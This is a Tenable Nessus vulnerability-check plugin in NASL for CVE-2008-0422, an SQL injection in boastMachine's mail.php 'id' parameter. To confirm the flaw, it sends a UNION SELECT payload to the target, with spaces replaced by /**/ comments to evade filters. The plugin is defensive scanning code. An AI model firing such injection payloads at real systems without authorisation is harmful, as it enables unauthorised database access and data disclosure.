#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(30052);
  script_version("$Revision: 1.22 $");

  script_cve_id("CVE-2008-0422");
  script_bugtraq_id(27369);
  script_osvdb_id(40960);
  script_xref(name:"EDB-ID", value:"4952");

  script_name(english:"boastMachine mail.php id Parameter SQL Injection");
  script_summary(english:"Tries to manipulate a post title using mail.php");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running boastMachine, an open source publishing
tool written in PHP. 

The version of boastMachine installed on the remote host fails to
sanitize user input to the 'id' parameter of the 'mail.php' script
before using it to perform database queries.  Provided PHP's
'magic_quotes_gpc' setting is disabled, an attacker may be able to
exploit this issue to manipulate database queries to disclose
sensitive information, bypass authentication, or even attack the
underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/486737/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(89);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/01/23");
 script_cvs_date("$Date: 2016/05/19 17:45:33 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:boastmachine:boastmachine");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/boastmachine", "/bmachine", "/blog", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Grab index.php.
  res = http_get_cache(item:string(dir, "/index.php"), port:port, exit_on_fail: 1);

  # Identify a blog; fallback to '1' if we didn't find one.
  blog = NULL;

  pat = '<input type="hidden" name="blog" value="([0-9]+)"';
  matches = egrep(pattern:pat, string:res);
  if (matches) 
  {
    foreach match (split(matches)) 
    {
      match = chomp(match);
      item = eregmatch(pattern:pat, string:match);
      if (!isnull(item))
      {
        blog = item[1];
        break;
      }
    }
  }
  if (isnull(blog)) blog = 1;

  magic = unixtime();
  exploit = string("' UNION SELECT 1,2,", magic, ",4--");
  exploit = str_replace(find:" ", replace:"/**/", string:exploit);

  # Try to exploit the issue to manipulate a post's title.
  r = http_send_recv3(method:"GET", port: port,
    item:string(dir, "/mail.php?","id=", exploit, "&",
      "blog=", blog));
  if (isnull(r)) exit(0);
  res = r[2];
  
  # There's a problem if we see our magic in the post title.
  if (string('<h1>Send the post "', magic, '" to a friend') >< res)
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
